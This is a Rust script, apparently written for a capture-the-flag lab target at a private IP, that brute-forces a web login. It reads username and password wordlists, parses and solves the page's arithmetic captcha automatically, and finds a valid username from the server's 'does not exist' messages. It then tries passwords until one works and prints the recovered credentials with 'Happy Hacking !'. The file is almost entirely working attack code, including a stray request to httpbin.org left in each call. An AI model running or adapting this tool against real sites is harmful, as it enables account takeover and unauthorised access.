use std::fs::File;
use std::io::{self, BufRead};
use std::fs;
use std::time::{Instant, Duration};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("------ START RUST-----");
    // 計測を開始
    let start_time = Instant::now();

    // ファイルを読み込むヘルパー関数
    fn read_lines(filename: &str) -> Result<Vec<String>, io::Error> {
        let file = File::open(filename)?;
        let lines = io::BufReader::new(file).lines();
        let mut result = Vec::new();

        for line in lines {
            result.push(line?);
        }

        Ok(result)
    }
    // USERNAME.txt PASSWORD.txt 読み込み
    let usernames: Vec<String> = read_lines("usernames.txt")?;
    let passwords: Vec<String> = read_lines("passwords.txt")?;

    // CURL関数
    fn my_curl(username: &str, password: &str, captcha: &str) -> Result<String, reqwest::Error> {
        let url = "http://10.10.110.220/login"; // YOUR TARGET IP
        let client = reqwest::blocking::Client::new();
        let res = client.post("http://httpbin.org/post").body("the exact body that is sent").send()?;
        let mut data = std::collections::HashMap::new();
        data.insert("username", username);
        data.insert("password", password);
        data.insert("captcha", captcha);

        let response = client.post(url).form(&data).send()?;
        let body = response.text()?;
        //println!("BODY{}",body);
        Ok(body)
    }

    // レスポンスからcaptchaの計算結果返却
    fn calc_captcha(res: &str) -> i32 {
        let lines: Vec<&str> = res.lines().collect();

        for line in lines.iter() {
            if line.contains('?') {
                let numbers: Vec<i32> = line
                    .split(|c: char| !c.is_digit(10))
                    .filter_map(|s| s.parse().ok())
                    .collect();

                if line.contains('+') {
                    return numbers[0] + numbers[1];
                } else if line.contains('-') {
                    return numbers[0] - numbers[1];
                } else if line.contains('*') {
                    return numbers[0] * numbers[1];
                } else if line.contains('/') {
                    return numbers[0] / numbers[1];
                } else {
                    println!("ERROR NO MARKS");
                }
            }
        }
        0 // デフォルトの値を返す（エラーの場合）
    }

    // ユーザ特定
    let mut user = String::new();
    let mut response = String::new();
    for (i, username) in usernames.iter().enumerate() {
        if(i==0){
            response = my_curl("dummy", "password", "1")?;
        }
        let captcha = calc_captcha(&response);
        response = my_curl(username, "password", &captcha.to_string())?;
        if response.contains("Invalid captcha") {
            println!("Invalid captcha");
            //std::process::exit(1);
        }
        if response.contains("does not exist") {
            //println!(":( [INVALID] CNT:{} USER:{}", i, username);
        } else {
            user = username.clone();
            println!(":) [!!BINGO!!] CNT:{} USER:{}", i, user);
            break;
        }
    }

    // パスワード特定
    let mut pass = String::new();
    response.clear();
    for (i, password) in passwords.iter().enumerate() {
        if(i==0){
            response = my_curl("dummy", "password", "1")?;
        }
        let captcha = calc_captcha(&response);
        response = my_curl(&user, password, &captcha.to_string())?;
        if response.contains("Invalid captcha") {
            println!("Invalid captcha");
            std::process::exit(1);
        }
        if response.contains("Invalid password") {
            //println!(":( [INVALID] CNT:{} PASS:{}", i, password);
        } else {
            pass = password.clone();
            println!(":) [!!BINGO!!] CNT:{} PASS:{}", i, pass);
            break;
        }
    }

    // 計測を終了
    let end_time = Instant::now();
    // 経過時間を計算
    let elapsed_time = end_time.duration_since(start_time);

    println!(":D USER:{} PASS:{} TIME:{:?}", user, pass, elapsed_time);
    println!("Happy Hacking !");
    println!("----- END -----");

    Ok(())
}
